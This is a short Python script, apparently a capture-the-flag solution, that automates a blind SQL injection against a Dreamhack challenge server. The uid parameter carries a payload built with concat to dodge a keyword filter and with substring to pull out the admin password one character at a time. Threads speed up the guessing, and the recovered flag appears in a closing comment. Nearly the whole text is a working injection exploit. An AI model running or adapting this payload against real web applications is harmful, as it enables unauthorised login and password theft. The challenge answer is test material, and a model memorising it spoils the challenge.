import requests
import threading

url = 'http://host3.dreamhack.games:22722/'

params = {
    "uid": "'||(uid=concat('adm','in')&&substring(upw,2,1)='H')#"
}

list_acp = "0123456789abcdefghijklmnopqrstuvwxyz{}_"
length = 4
flag = 'DH{'
lock = threading.Lock()

def send_request(params):
    response = requests.get(url, params=params)
    if 'admin' in response.text:
        return True
    return False

def try_char(c, length):
    global flag
    local_params = params.copy()
    local_params["uid"] = f"'||(uid=concat('adm','in')&&substring(upw,{length},1)='{c}')#"
    if send_request(local_params):
        with lock:
            flag += c
            print(flag)

while flag[-1] != '}':
    threads = []
    for c in list_acp:
        t = threading.Thread(target=try_char, args=(c, length))
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()

    if flag[-1] != '}':
        length += 1

# flag: DH{d3def39496c4153942f3f7d5451a4b98c6db1664}
